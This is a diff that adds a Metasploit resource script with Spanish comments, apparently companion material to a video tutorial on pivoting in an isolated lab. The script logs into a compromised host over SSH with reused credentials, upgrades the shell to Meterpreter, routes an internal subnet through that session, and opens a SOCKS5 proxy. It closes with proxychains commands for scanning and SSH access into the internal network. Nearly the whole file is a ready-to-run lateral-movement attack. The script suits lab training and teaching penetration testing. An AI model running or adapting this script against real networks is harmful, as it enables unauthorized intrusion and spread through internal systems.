@@ -1,0 +1,34 @@
+# pivot.rc — Movimiento lateral / pivoting con Metasploit (laboratorio AISLADO Morini)
+# Uso:  msfconsole -q -r pivot.rc
+# Todo lo del vídeo, en un solo comando, para que lo reutilices. Contra máquinas PROPIAS.
+#
+# ---------------------------------------------------------------------------
+# 1) Entrar en la máquina ya comprometida (el "pivote") reutilizando credenciales
+#    que sacamos en el episodio de contraseñas. ssh_login abre una sesión de shell.
+use auxiliary/scanner/ssh/ssh_login
+set RHOSTS 10.13.37.20
+set USERNAME soporte
+set PASSWORD soporte123
+set STOP_ON_SUCCESS true
+run
+#
+# 2) Subir esa shell a Meterpreter: hace falta para poder enrutar tráfico a través de ella.
+sessions -u 1
+sleep 30
+#
+# 3) AUTORUTA: mete la red interna en la tabla de rutas de Metasploit, "a través" de la sesión.
+#    A partir de aquí, los módulos de Metasploit ya llegan a esa red por el pivote.
+route add 10.66.66.0/24 2
+route print
+#
+# 4) SOCKS: publica esas rutas como un proxy SOCKS5 en 127.0.0.1:1080, para tus herramientas
+#    externas (nmap, curl, ssh...) vía proxychains.
+use auxiliary/server/socks_proxy
+set SRVHOST 127.0.0.1
+set SRVPORT 1080
+set VERSION 5
+run -j
+#
+# Con "socks5 127.0.0.1 1080" en /etc/proxychains4.conf, desde una shell de Kali:
+#   proxychains4 nmap -sT -Pn -n 10.66.66.40     # OJO: -sT y -Pn (por SOCKS no pasan ni SYN ni ping)
+#   proxychains4 ssh soporte@10.66.66.40         # reuso de credenciales -> dentro de la red interna
